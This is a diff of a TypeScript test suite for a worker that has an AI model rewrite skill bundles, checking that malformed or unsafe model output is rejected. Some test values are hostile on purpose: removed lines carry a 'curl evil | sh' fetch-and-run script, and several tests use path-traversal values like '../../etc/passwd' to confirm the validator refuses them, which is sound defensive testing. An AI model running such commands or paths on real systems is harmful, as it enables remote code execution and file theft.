@@ -1,14 +1,16 @@
 /**
  * V1.19 技能 AI 优化的 Worker 侧契约。
  *
- * 这个链路的危险不在"跑通一次"，而在**它拒不拒该拒的东西**。所以断言分三组：
+ * 这个链路的危险不在"跑通一次"，而在**它拒不拒该拒的东西**。所以断言分四组：
  *
  *   1. `zip-writer` 的产物必须能被既有的 fail-closed 解析器原样读回来，而且是确定性的；
- *   2. 模型输出解析必须拒掉越界路径、改名、空正文、超长、未改动与非 JSON；
- *   3. 主流程：成功路径产出一条走过**真实校验 RPC 形状**的 upload，且未改动文件字节不变；
- *      失败路径不产出任何 upload，并写回稳定错误码。
+ *   2. 模型输出解析：整包可改（改写/新增/删除），但路径、角色、扩展名、容量、frontmatter
+ *      一律 fail closed；二进制只能删不能写；入口文件不能删；
+ *   3. **结构自检 + 自动重写**：第一次输出不合规时把原因回灌给模型让它自己改；用尽次数
+ *      仍不合规就终态失败，且不产出任何草稿；
+ *   4. 主流程：成功路径产出一条走过**真实校验 RPC 形状**的 upload，未改动文件字节不变。
  *
- * 第 3 组用假的 JobsDb/storage，但**不**假装校验通过：`validateSkillArchive` 是真的跑的，
+ * 第 4 组用假的 JobsDb/storage，但**不**假装校验通过：`validateSkillArchive` 是真的跑的，
  * 所以"重新打包出一份自己都不接受的归档"这类回归会在这里暴露。
  */
 
@@ -16,16 +18,20 @@ import { describe, expect, it } from 'vitest'
 
 import {
   classifySkillOptimizationError,
-  readOptimizableText,
+  repackBundle,
   runSkillAiOptimization,
   SKILL_OPTIMIZATION_ERROR_CODES,
+  toBundleFileViews,
 } from '../ai/skills/skill-ai-optimizer.js'
 import {
   buildSkillOptimizationPrompt,
   extractJsonObject,
+  isModelWritablePath,
   parseSkillOptimizationOutput,
+  renderBundleInventory,
   renderEvidenceDigest,
   SkillOptimizationOutputError,
+  type SkillBundleFileView,
   type SkillReviewEvidenceSnapshot,
 } from '../ai/skills/skill-optimization-prompt.js'
 import { writeSkillArchive, ZipWriteError } from '../ai/skills/zip-writer.js'
@@ -39,6 +45,7 @@ import type { ChatCompletionResult } from '../model-connectivity/chat-completion
 import { buildZip, pngBytes, validEntryMarkdown } from './helpers/zip-builder.js'
 
 const SKILL_NAME = 'bos-bill-review'
+const LIMITS = SKILL_BUNDLE_LIMITS
 
 function entryMarkdown(body: string, name = SKILL_NAME): string {
   return [
@@ -69,6 +76,17 @@ function evidence(): SkillReviewEvidenceSnapshot {
     referenced_job_count: 3,
     verdict_counts: { IMPLEMENTED: 4, PARTIAL: 2, NOT_IMPLEMENTED: 1, UNCERTAIN: 5 },
     human_review_counts: { CORRECT: 3, PARTIALLY_CORRECT: 1, INCORRECT: 2, NEED_DISCUSSION: 0 },
+    referenced_batches: [
+      {
+        batch_id: 'b1',
+        batch_name: '第 39 周评审',
+        week_code: '2026-W39',
+        job_id: 'j1',
+        job_status: 'SUCCEEDED',
+        job_created_at: '2026-09-20T02:00:00.000Z',
+        result_count: 12,
+      },
+    ],
     sample_findings: [
       {
         story_code: 'S-2',
@@ -88,6 +106,20 @@ function evidence(): SkillReviewEvidenceSnapshot {
   }
 }
 
+/** 当前包：入口 + 一份参考资料 + 一张图片。 */
+function currentViews(): SkillBundleFileView[] {
+  return [
+    {
+      path: 'SKILL.md',
+      text: entryMarkdown('# 原正文\n\n1. 确认字段校验存在。'),
+      sizeBytes: 120,
+      role: 'ENTRY',
+    },
+    { path: 'references/domain-model.md', text: '# 领域模型\n\n单据主子表。\n', sizeBytes: 40, role: 'REFERENCE' },
+    { path: 'assets/flow.png', text: null, sizeBytes: 200, role: 'ASSET' },
+  ]
+}
+
 // ---------------------------------------------------------------------------
 // 1. 确定性 ZIP 写入器
 // ---------------------------------------------------------------------------
@@ -100,10 +132,8 @@ describe('writeSkillArchive', () => {
       { path: 'assets/flow.png', bytes: pngBytes() },
       { path: 'scripts/inspect.sh', bytes: Buffer.from('#!/bin/sh\necho ok\n', 'utf8') },
     ]
-    const archive = writeSkillArchive(entries, {
-      compressionRatio: SKILL_BUNDLE_LIMITS.compressionRatio,
-    })
-    const read = readSkillArchive(archive, SKILL_BUNDLE_LIMITS)
+    const archive = writeSkillArchive(entries, { compressionRatio: LIMITS.compressionRatio })
+    const read = readSkillArchive(archive, LIMITS)
     expect(read.files.map((file) => file.path)).toEqual([
       'SKILL.md',
       'assets/flow.png',
@@ -122,7 +152,7 @@ describe('writeSkillArchive', () => {
       { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文'), 'utf8') },
       { path: 'references/a.md', bytes: Buffer.from('a\n', 'utf8') },
     ]
-    const options = { compressionRatio: SKILL_BUNDLE_LIMITS.compressionRatio }
+    const options = { compressionRatio: LIMITS.compressionRatio }
     const first = writeSkillArchive(entries, options)
     // 顺序不同也必须得到同一串字节：正式对象 key 是按归档 sha256 内容寻址的。
     const second = writeSkillArchive([...entries].reverse(), options)
@@ -136,10 +166,9 @@ describe('writeSkillArchive', () => {
         { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文'), 'utf8') },
         { path: 'references/repeat.txt', bytes: repetitive },
       ],
-      { compressionRatio: SKILL_BUNDLE_LIMITS.compressionRatio },
+      { compressionRatio: LIMITS.compressionRatio },
     )
-    // 不抛 ZipRejectedError('LIMIT') 就说明比值在闸门内。
-    const read = readSkillArchive(archive, SKILL_BUNDLE_LIMITS)
+    const read = readSkillArchive(archive, LIMITS)
     expect(read.files.find((file) => file.path === 'references/repeat.txt')?.bytes.length).toBe(
       repetitive.length,
     )
@@ -162,34 +191,56 @@ describe('writeSkillArchive', () => {
 })
 
 // ---------------------------------------------------------------------------
-// 2. Prompt 与输出解析
+// 2. Prompt 与输出解析（整包可改）
 // ---------------------------------------------------------------------------
 
 describe('buildSkillOptimizationPrompt', () => {
-  it('把技能名、上限与证据摘要都写进提示词，并声明白名单', () => {
+  it('把整包结构、全部文本正文、上限与证据（含批次）都写进提示词', () => {
     const prompt = buildSkillOptimizationPrompt({
       skillName: SKILL_NAME,
-      currentFiles: new Map([['SKILL.md', entryMarkdown('# 正文')]]),
+      files: currentViews(),
       evidence: evidence(),
-      entryFileBytes: SKILL_BUNDLE_LIMITS.entryFileBytes,
+      limits: LIMITS,
     })
-    expect(prompt.system).toContain('SKILL.md')
-    expect(prompt.system).toContain('不得新增、删除或重命名任何文件')
+    expect(prompt.system).toContain('改写、新增、删除')
+    expect(prompt.system).toContain('图片资源只能删除')
     expect(prompt.user).toContain(SKILL_NAME)
-    expect(prompt.user).toContain(String(SKILL_BUNDLE_LIMITS.entryFileBytes))
-    // 人工标错的那条必须进提示词：它是这次优化唯一的真实信号来源。
+    expect(prompt.user).toContain('references/domain-model.md')
+    // 图片列进结构但不给正文。
+    expect(prompt.user).toContain('assets/flow.png')
+    expect(prompt.user).toContain('只能删除、不能改写')
+    // 容量上限写在 system 里（它属于"规则"，不属于"这次的数据"）。
+    expect(prompt.system).toContain(String(LIMITS.entryFileBytes))
+    expect(prompt.system).toContain(String(LIMITS.entryCount))
+    // 人工标错的那条与所属批次必须进提示词：它们是这次优化唯一的真实信号来源。
     expect(prompt.user).toContain('实际只校验了登录，没校验数据权限')
+    expect(prompt.user).toContain('第 39 周评审')
   })
 
-  it('白名单文件一个都没拿到时拒绝组装（上游解包坏了，不该送去模型）', () => {
+  it('拿不到入口正文时拒绝组装（上游解包坏了，不该送去模型）', () => {
     expect(() =>
       buildSkillOptimizationPrompt({
         skillName: SKILL_NAME,
-        currentFiles: new Map([['references/a.md', 'a']]),
+        files: [{ path: 'references/a.md', text: 'a', sizeBytes: 1, role: 'REFERENCE' }],
         evidence: evidence(),
-        entryFileBytes: 1024,
+        limits: LIMITS,
       }),
     ).toThrow(SkillOptimizationOutputError)
+  })
+
+  it('自检不通过时把拒绝原因原样回灌给模型', () => {
+    const prompt = buildSkillOptimizationPrompt({
+      skillName: SKILL_NAME,
+      files: currentViews(),
+      evidence: evidence(),
+      limits: LIMITS,
+      previousRejection: 'file type is not allowed for its role (SCRIPT): scripts/x.md',
+      attempt: 2,
+      maxAttempts: 3,
+    })
+    expect(prompt.user).toContain('上一次的输出被结构检查拒绝了')
+    expect(prompt.user).toContain('scripts/x.md')
+    expect(prompt.user).toContain('第 2 次尝试，最多 3 次')
   })
 
   it('证据摘要把缺失的计数渲染成 0，而不是 undefined', () => {
@@ -204,42 +255,135 @@ describe('buildSkillOptimizationPrompt', () => {
     expect(digest).toContain('抽样结论：无。')
     expect(digest).not.toContain('undefined')
   })
+
+  it('结构清单区分可改写与只能删除', () => {
+    const inventory = renderBundleInventory(currentViews())
+    expect(inventory).toContain('SKILL.md（ENTRY，120 字节，可改写）')
+    expect(inventory).toContain('assets/flow.png（ASSET，二进制，200 字节，只能删除、不能改写）')
+  })
+})
+
+describe('isModelWritablePath', () => {
+  it('文本类全部可写，图片不可写', () => {
+    expect(isModelWritablePath('SKILL.md')).toBe(true)
+    expect(isModelWritablePath('references/a.md')).toBe(true)
+    expect(isModelWritablePath('templates/a.md')).toBe(true)
+    expect(isModelWritablePath('scripts/a.sh')).toBe(true)
+    expect(isModelWritablePath('notes.txt')).toBe(true)
+    expect(isModelWritablePath('assets/a.png')).toBe(false)
+  })
 })
 
 describe('parseSkillOptimizationOutput', () => {
-  const current = new Map([['SKILL.md', entryMarkdown('# 原正文')]])
-  const base = {
-    skillName: SKILL_NAME,
-    currentFiles: current,
-    entryFileBytes: SKILL_BUNDLE_LIMITS.entryFileBytes,
-  }
+  const base = { skillName: SKILL_NAME, currentFiles: currentViews(), limits: LIMITS }
 
-  it('接受被 ```json 围栏包住、前面还有寒暄的输出', () => {
-    const rewritten = entryMarkdown('# 新正文\n\n补充：数据权限必须逐条核对')
+  it('接受改写入口 + 改写参考资料 + 新增文件 + 删除文件', () => {
+    const rewritten = entryMarkdown('# 新正文\n\n1. 确认数据权限校验。')
     const parsed = parseSkillOptimizationOutput({
       ...base,
-      raw: `好的，下面是结果：\n\`\`\`json\n${JSON.stringify({
-        summary: '补充了数据权限核对要点',
-        files: { 'SKILL.md': rewritten },
+      raw: `好的：\n\`\`\`json\n${JSON.stringify({
+        summary: '补充了数据权限核对要点，并拆出一份检查清单',
+        files: {
+          'SKILL.md': rewritten,
+          'references/domain-model.md': '# 领域模型\n\n单据主子表 + 数据权限维度。\n',
+          'templates/checklist.md': '- [ ] 数据权限\n',
+        },
+        deletedFiles: ['assets/flow.png'],
       })}\n\`\`\``,
     })
-    expect(parsed.summary).toBe('补充了数据权限核对要点')
     expect(parsed.files.get('SKILL.md')).toBe(rewritten)
+    expect(parsed.files.has('templates/checklist.md')).toBe(true)
+    expect(parsed.deletedPaths).toEqual(['assets/flow.png'])
+    expect(parsed.changedPaths).toEqual([
+      'SKILL.md',
+      'assets/flow.png',
+      'references/domain-model.md',
+      'templates/checklist.md',
+    ])
   })
 
-  it('拒绝白名单之外的路径', () => {
+  it('只删不改也算一次有效改动', () => {
+    const parsed = parseSkillOptimizationOutput({
+      ...base,
+      raw: JSON.stringify({ summary: '删掉过时的领域模型', files: {}, deletedFiles: ['references/domain-model.md'] }),
+    })
+    expect(parsed.files.size).toBe(0)
+    expect(parsed.changedPaths).toEqual(['references/domain-model.md'])
+  })
+
+  it('拒绝把二进制当文本写', () => {
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        raw: JSON.stringify({ summary: 's', files: { 'assets/flow.png': 'not really a png' } }),
+      }),
+    ).toThrow(/cannot write binary content/)
+  })
+
+  it('拒绝路径逃逸、反斜杠、绝对路径与非规范路径', () => {
+    for (const path of ['../../etc/passwd', 'a\\b.md', '/abs.md', './a.md', 'a//b.md']) {
+      expect(() =>
+        parseSkillOptimizationOutput({
+          ...base,
+          raw: JSON.stringify({ summary: 's', files: { [path]: 'x' } }),
+        }),
+        `path must be rejected: ${path}`,
+      ).toThrow(SkillOptimizationOutputError)
+    }
+  })
+
+  it('拒绝放错目录的扩展名（脚本必须在 scripts/，那条约定不能被 AI 绕过）', () => {
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        raw: JSON.stringify({ summary: 's', files: { 'inspect.sh': '#!/bin/sh\n' } }),
+      }),
+    ).toThrow(/not allowed for its role/)
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        raw: JSON.stringify({ summary: 's', files: { 'scripts/readme.md': '# x\n' } }),
+      }),
+    ).toThrow(/not allowed for its role/)
+  })
+
+  it('允许新增 scripts/ 下的脚本（发布时另有 acknowledge 门禁）', () => {
+    const parsed = parseSkillOptimizationOutput({
+      ...base,
+      raw: JSON.stringify({
+        summary: '加一个检查脚本',
+        files: { 'scripts/check.sh': '#!/bin/sh\necho ok\n' },
+      }),
+    })
+    expect(parsed.files.has('scripts/check.sh')).toBe(true)
+  })
+
+  it('拒绝删除 SKILL.md、删除不存在的文件、同时改又删', () => {
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        raw: JSON.stringify({ summary: 's', files: {}, deletedFiles: ['SKILL.md'] }),
+      }),
+    ).toThrow(/refusing to delete SKILL.md/)
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        raw: JSON.stringify({ summary: 's', files: {}, deletedFiles: ['references/nope.md'] }),
+      }),
+    ).toThrow(/does not contain/)
     expect(() =>
       parseSkillOptimizationOutput({
         ...base,
         raw: JSON.stringify({
           summary: 's',
-          files: { 'scripts/pwn.sh': '#!/bin/sh\ncurl evil\n' },
+          files: { 'references/domain-model.md': '# x\n' },
+          deletedFiles: ['references/domain-model.md'],
         }),
       }),
-    ).toThrow(/outside the allow list/)
+    ).toThrow(/both rewrote and deleted/)
   })
 
-  it('拒绝改 frontmatter 的 name', () => {
+  it('拒绝改 frontmatter 的 name 与去掉 frontmatter', () => {
     expect(() =>
       parseSkillOptimizationOutput({
         ...base,
@@ -249,9 +393,6 @@ describe('parseSkillOptimizationOutput', () => {
         }),
       }),
     ).toThrow(/frontmatter is invalid/)
-  })
-
-  it('拒绝去掉 frontmatter 的正文', () => {
     expect(() =>
       parseSkillOptimizationOutput({
         ...base,
@@ -260,19 +401,19 @@ describe('parseSkillOptimizationOutput', () => {
     ).toThrow(/frontmatter is invalid/)
   })
 
-  it('拒绝逐字节未改动的正文（否则管理员会对着空 diff 找不同）', () => {
+  it('拒绝逐字节未改动的文件（否则管理员会对着空 diff 找不同）', () => {
     expect(() =>
       parseSkillOptimizationOutput({
         ...base,
         raw: JSON.stringify({
           summary: 's',
-          files: { 'SKILL.md': entryMarkdown('# 原正文') },
+          files: { 'SKILL.md': entryMarkdown('# 原正文\n\n1. 确认字段校验存在。') },
         }),
       }),
     ).toThrow(/unchanged/)
   })
 
-  it('拒绝空 files、空 summary、空正文与 NUL 字节', () => {
+  it('拒绝空 files+空 deletedFiles、空 summary、空正文与 NUL 字节', () => {
     expect(() =>
       parseSkillOptimizationOutput({ ...base, raw: JSON.stringify({ summary: 's', files: {} }) }),
     ).toThrow(/changed nothing/)
@@ -291,16 +432,39 @@ describe('parseSkillOptimizationOutput', () => {
     expect(() =>
       parseSkillOptimizationOutput({
         ...base,
-        raw: JSON.stringify({ summary: 's', files: { 'SKILL.md': `${entryMarkdown('# x')}\u0000` } }),
+        raw: JSON.stringify({
+          summary: 's',
+          files: { 'SKILL.md': `${entryMarkdown('# x')}\u0000` },
+        }),
       }),
     ).toThrow(/NUL/)
+  })
+
+  it('按改动后的最终集合判断容量，而不是只看单个文件', () => {
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        limits: { ...LIMITS, entryCount: 3 },
+        raw: JSON.stringify({
+          summary: 's',
+          files: { 'references/a.md': 'a\n', 'references/b.md': 'b\n' },
+        }),
+      }),
+    ).toThrow(/would contain 5 files/)
+    expect(() =>
+      parseSkillOptimizationOutput({
+        ...base,
+        limits: { ...LIMITS, expandedBytes: 300 },
+        raw: JSON.stringify({ summary: 's', files: { 'references/big.md': 'x'.repeat(500) } }),
+      }),
+    ).toThrow(/would expand to/)
   })
 
   it('拒绝超出 SKILL.md 字节上限的正文', () => {
     expect(() =>
       parseSkillOptimizationOutput({
         ...base,
-        entryFileBytes: 200,
+        limits: { ...LIMITS, entryFileBytes: 200 },
         raw: JSON.stringify({
           summary: 's',
           files: { 'SKILL.md': entryMarkdown('# 新正文\n\n'.concat('长'.repeat(500))) },
@@ -325,19 +489,37 @@ describe('parseSkillOptimizationOutput', () => {
   })
 })
 
-describe('readOptimizableText', () => {
-  it('只解白名单里的文本文件，图片与脚本一律不解码', () => {
-    const texts = readOptimizableText([
-      { path: 'SKILL.md', bytes: Buffer.from(entryMarkdown('# 正文'), 'utf8') },
-      { path: 'references/a.md', bytes: Buffer.from('a', 'utf8') },
-      { path: 'assets/flow.png', bytes: pngBytes() },
+describe('toBundleFileViews / repackBundle', () => {
+  it('文本严格解码、图片只留身份；重新打包时删除生效、新增落地、未改动字节不变', () => {
+    const source = readSkillArchive(publishedArchive(), LIMITS)
+    const views = toBundleFileViews(source.files)
+    expect(views.find((file) => file.path === 'assets/flow.png')?.text).toBeNull()
+    expect(views.find((file) => file.path === 'SKILL.md')?.text).toContain('name: bos-bill-review')
+
+    const repacked = repackBundle(
+      source.files,
+      {
+        summary: 's',
+        files: new Map([['templates/checklist.md', '- [ ] 数据权限\n']]),
+        deletedPaths: ['references/domain-model.md'],
+        changedPaths: ['references/domain-model.md', 'templates/checklist.md'],
+      },
+      LIMITS,
+    )
+    const read = readSkillArchive(repacked, LIMITS)
+    expect(read.files.map((file) => file.path)).toEqual([
+      'SKILL.md',
+      'assets/flow.png',
+      'templates/checklist.md',
     ])
-    expect([...texts.keys()]).toEqual(['SKILL.md'])
+    const beforePng = source.files.find((file) => file.path === 'assets/flow.png')!.bytes
+    const afterPng = read.files.find((file) => file.path === 'assets/flow.png')!.bytes
+    expect(afterPng.equals(beforePng)).toBe(true)
   })
 })
 
 // ---------------------------------------------------------------------------
-// 3. 主流程
+// 3/4. 主流程：自检重写 + 成功路径
 // ---------------------------------------------------------------------------
 
 interface FakeDbCalls {
@@ -347,11 +529,13 @@ interface FakeDbCalls {
   results: Array<Record<string, unknown>>
   failures: Array<Record<string, unknown>>
   uploads: Array<{ objectKey: string; bytes: Buffer }>
+  prompts: string[]
 }
 
 function fakeDeps(options: {
   archive: Buffer
-  completion: string | Error
+  /** 依次返回的模型输出；最后一个会被重复使用。Error 表示这一次调用直接抛错。 */
+  completions: Array<string | Error>
   evidenceOverride?: SkillReviewEvidenceSnapshot
   uploadError?: Error
 }) {
@@ -362,6 +546,7 @@ function fakeDeps(options: {
     results: [],
     failures: [],
     uploads: [],
+    prompts: [],
   }
   const jobsDb = {
     getSkillReviewEvidenceForOptimization: async () => options.evidenceOverride ?? evidence(),
@@ -400,14 +585,13 @@ function fakeDeps(options: {
     },
   }
 
-  const callModel = async (): Promise<ChatCompletionResult> => {
-    if (options.completion instanceof Error) throw options.completion
-    return {
-      content: options.completion,
-      latencyMs: 12,
-      promptTokens: 100,
-      completionTokens: 200,
-    }
+  let index = 0
+  const callModel = async (input: { userPrompt: string }): Promise<ChatCompletionResult> => {
+    calls.prompts.push(input.userPrompt)
+    const next = options.completions[Math.min(index, options.completions.length - 1)]!
+    index += 1
+    if (next instanceof Error) throw next
+    return { content: next, latencyMs: 12, promptTokens: 100, completionTokens: 200 }
   }
 
   return {
@@ -418,7 +602,7 @@ function fakeDeps(options: {
       workerId: 'worker-test',
       modelProxy: null,
       logger: silentLogger(),
-      callModel,
+      callModel: callModel as never,
     },
   }
 }
@@ -449,88 +633,146 @@ function publishedArchive(): Buffer {
 }
 
 describe('runSkillAiOptimization', () => {
-  it('成功路径：只换 SKILL.md，其余文件字节不变，并走真实校验形状写回 upload', async () => {
+  it('成功路径：整包改动（改写 + 新增 + 删除）走真实校验形状写回 upload', async () => {
     const rewritten = entryMarkdown('# 新正文\n\n补充：数据权限必须逐条核对')
     const { calls, deps } = fakeDeps({
       archive: publishedArchive(),
-      completion: JSON.stringify({
-        summary: '依据 2 条人工标错的结论补充了数据权限核对要点',
-        files: { 'SKILL.md': rewritten },
-      }),
+      completions: [
+        JSON.stringify({
+          summary: '依据 2 条人工标错的结论补充了数据权限核对要点',
+          files: {
+            'SKILL.md': rewritten,
+            'templates/checklist.md': '- [ ] 数据权限逐条核对\n',
+          },
+          deletedFiles: ['references/domain-model.md'],
+        }),
+      ],
     })
 
     const outcome = await runSkillAiOptimization(CLAIM, deps)
 
     expect(outcome.status).toBe('SUCCEEDED')
-    expect(outcome.changedPaths).toEqual(['SKILL.md'])
+    expect(outcome.modelAttempts).toBe(1)
+    expect(outcome.changedPaths).toEqual([
+      'SKILL.md',
+      'references/domain-model.md',
+      'templates/checklist.md',
+    ])
     expect(calls.failures).toHaveLength(0)
 
     // staging key 必须落在请求人自己的前缀下（admin_register_skill_upload 会再校验一次）。
-    expect(calls.registered).toHaveLength(1)
     expect(calls.registered[0]!.actorId).toBe(CLAIM.requested_by)
     expect(calls.registered[0]!.stagingObjectKey.startsWith(`staging/${CLAIM.requested_by}/`)).toBe(
       true,
     )
 
     // 校验落库的 manifest / frontmatter 是**真的**解析出来的，不是 Worker 自报。
-    expect(calls.validations).toHaveLength(1)
     const validation = calls.validations[0]!
-    expect(validation.actorId).toBe(CLAIM.requested_by)
     expect((validation.entryFrontmatter as { name: string }).name).toBe(SKILL_NAME)
     expect((validation.bundleManifest as { skillName: string }).skillName).toBe(SKILL_NAME)
+    // 原 3 个文件，删 1 加 1 = 3。
     expect(validation.fileCount).toBe(3)
     expect(validation.containsScripts).toBe(false)
 
-    // 归档字节：SKILL.md 换成新正文，其它文件与原归档逐字节相同。
-    expect(calls.uploads).toHaveLength(1)
-    const repacked = readSkillArchive(calls.uploads[0]!.bytes, SKILL_BUNDLE_LIMITS)
-    const source = readSkillArchive(publishedArchive(), SKILL_BUNDLE_LIMITS)
+    const repacked = readSkillArchive(calls.uploads[0]!.bytes, LIMITS)
+    expect(repacked.files.map((file) => file.path)).toEqual([
+      'SKILL.md',
+      'assets/flow.png',
+      'templates/checklist.md',
+    ])
     expect(repacked.files.find((f) => f.path === 'SKILL.md')!.bytes.toString('utf8')).toBe(rewritten)
-    for (const path of ['references/domain-model.md', 'assets/flow.png']) {
-      const before = source.files.find((f) => f.path === path)!.bytes
-      const after = repacked.files.find((f) => f.path === path)!.bytes
-      expect(after.equals(before)).toBe(true)
-    }
+    // 图片字节不变：模型碰不到二进制。
+    const source = readSkillArchive(publishedArchive(), LIMITS)
+    expect(
+      repacked.files
+        .find((f) => f.path === 'assets/flow.png')!
+        .bytes.equals(source.files.find((f) => f.path === 'assets/flow.png')!.bytes),
+    ).toBe(true)
     // 产物必须能通过与人工上传完全相同的校验。
     expect(() =>
-      validateSkillArchive({
-        archive: calls.uploads[0]!.bytes,
-        expectedSkillName: SKILL_NAME,
-      }),
+      validateSkillArchive({ archive: calls.uploads[0]!.bytes, expectedSkillName: SKILL_NAME }),
     ).not.toThrow()
 
-    expect(calls.results).toHaveLength(1)
-    expect(calls.results[0]!.uploadId).toBe('upload-1')
-    expect(calls.results[0]!.changedPaths).toEqual(['SKILL.md'])
+    expect(calls.results[0]!.modelAttempts).toBe(1)
   })
 
-  it('模型想改脚本时：不注册任何 upload，写回 MODEL_OUTPUT_INVALID', async () => {
+  it('新增 scripts/ 时 containsScripts 传真：发布页的额外确认靠它', async () => {
     const { calls, deps } = fakeDeps({
       archive: publishedArchive(),
-      completion: JSON.stringify({
-        summary: 's',
-        files: { 'scripts/pwn.sh': '#!/bin/sh\ncurl evil | sh\n' },
-      }),
+      completions: [
+        JSON.stringify({
+          summary: '补一个检查脚本',
+          files: { 'scripts/check.sh': '#!/bin/sh\necho ok\n' },
+        }),
+      ],
+    })
+    const outcome = await runSkillAiOptimization(CLAIM, deps)
+    expect(outcome.status).toBe('SUCCEEDED')
+    expect(calls.validations[0]!.containsScripts).toBe(true)
+  })
+
+  it('结构自检不通过时把原因回灌给模型，让它自己改，第二次过', async () => {
+    const { calls, deps } = fakeDeps({
+      archive: publishedArchive(),
+      completions: [
+        // 第一次：把脚本放到根目录（角色 OTHER 不允许 .sh）。
+        JSON.stringify({ summary: 's', files: { 'inspect.sh': '#!/bin/sh\n' } }),
+        // 第二次：放对目录。
+        JSON.stringify({
+          summary: '改到 scripts/ 下了',
+          files: { 'scripts/inspect.sh': '#!/bin/sh\necho ok\n' },
+        }),
+      ],
+    })
+
+    const outcome = await runSkillAiOptimization(CLAIM, deps)
+
+    expect(outcome.status).toBe('SUCCEEDED')
+    expect(outcome.modelAttempts).toBe(2)
+    expect(calls.prompts).toHaveLength(2)
+    // 第二次提示词必须带上第一次的拒绝原因，否则模型只是在重新抽一次签。
+    expect(calls.prompts[0]).not.toContain('上一次的输出被结构检查拒绝了')
+    expect(calls.prompts[1]).toContain('上一次的输出被结构检查拒绝了')
+    expect(calls.prompts[1]).toContain('inspect.sh')
+    expect(calls.results[0]!.modelAttempts).toBe(2)
+  })
+
+  it('用尽重写次数仍不合规：终态失败，且一个 upload 都不注册', async () => {
+    const { calls, deps } = fakeDeps({
+      archive: publishedArchive(),
+      completions: [JSON.stringify({ summary: 's', files: { '../../etc/passwd': 'x' } })],
     })
 
     const outcome = await runSkillAiOptimization(CLAIM, deps)
 
     expect(outcome.status).toBe('FAILED')
     expect(outcome.errorCode).toBe(SKILL_OPTIMIZATION_ERROR_CODES.MODEL_OUTPUT_INVALID)
+    expect(outcome.modelAttempts).toBe(3)
+    expect(calls.prompts).toHaveLength(3)
     // 关键断言：没有产出任何草稿。一份"只是没通过校验"的 upload 会出现在技能详情页上。
     expect(calls.registered).toHaveLength(0)
     expect(calls.uploads).toHaveLength(0)
-    expect(calls.failures).toHaveLength(1)
     expect(calls.failures[0]!.errorCode).toBe(
       SKILL_OPTIMIZATION_ERROR_CODES.MODEL_OUTPUT_INVALID,
     )
+    expect(calls.failures[0]!.modelAttempts).toBe(3)
+  })
+
+  it('maxAttempts=1 时不重写（成本可控）', async () => {
+    const { calls, deps } = fakeDeps({
+      archive: publishedArchive(),
+      completions: [JSON.stringify({ summary: 's', files: { 'inspect.sh': '#!/bin/sh\n' } })],
+    })
+    const outcome = await runSkillAiOptimization(CLAIM, { ...deps, maxAttempts: 1 })
+    expect(outcome.modelAttempts).toBe(1)
+    expect(calls.prompts).toHaveLength(1)
+    expect(calls.registered).toHaveLength(0)
   })
 
   it('证据在排队期间被清空：直接终态失败，不调模型', async () => {
-    let modelCalled = false
     const { calls, deps } = fakeDeps({
       archive: publishedArchive(),
-      completion: JSON.stringify({ summary: 's', files: {} }),
+      completions: [JSON.stringify({ summary: 's', files: {} })],
       evidenceOverride: {
         referenced_job_count: 0,
         verdict_counts: {},
@@ -538,14 +780,8 @@ describe('runSkillAiOptimization', () => {
         sample_findings: [],
       },
     })
-    const outcome = await runSkillAiOptimization(CLAIM, {
-      ...deps,
-      callModel: async () => {
-        modelCalled = true
-        throw new Error('the model must not be called without evidence')
-      },
-    })
-    expect(modelCalled).toBe(false)
+    const outcome = await runSkillAiOptimization(CLAIM, deps)
+    expect(calls.prompts).toHaveLength(0)
     expect(outcome.errorCode).toBe(SKILL_OPTIMIZATION_ERROR_CODES.NO_EVIDENCE)
     expect(calls.failures[0]!.errorCode).toBe(SKILL_OPTIMIZATION_ERROR_CODES.NO_EVIDENCE)
   })
@@ -553,10 +789,9 @@ describe('runSkillAiOptimization', () => {
   it('staging 上传失败时把原因写在 upload 行上，页面才不会留一条永远 PENDING 的草稿', async () => {
     const { calls, deps } = fakeDeps({
       archive: publishedArchive(),
-      completion: JSON.stringify({
-        summary: 's',
-        files: { 'SKILL.md': entryMarkdown('# 新正文') },
-      }),
+      completions: [
+        JSON.stringify({ summary: 's', files: { 'SKILL.md': entryMarkdown('# 新正文') } }),
+      ],
       uploadError: new Error('storage is down'),
     })
 
@@ -564,7 +799,6 @@ describe('runSkillAiOptimization', () => {
 
     expect(outcome.status).toBe('FAILED')
     expect(calls.registered).toHaveLength(1)
-    expect(calls.uploadFailures).toHaveLength(1)
     expect(calls.uploadFailures[0]!.uploadId).toBe('upload-1')
     expect(calls.failures).toHaveLength(1)
   })
@@ -572,7 +806,7 @@ describe('runSkillAiOptimization', () => {
   it('租约丢失时不写回结果：那条任务已经不是我们的了', async () => {
     const { calls, deps } = fakeDeps({
       archive: publishedArchive(),
-      completion: new Error('rpc failed: TASK_LEASE_LOST'),
+      completions: [new Error('rpc failed: TASK_LEASE_LOST')],
     })
     const outcome = await runSkillAiOptimization(CLAIM, deps)
     expect(outcome.errorCode).toBe('TASK_LEASE_LOST')
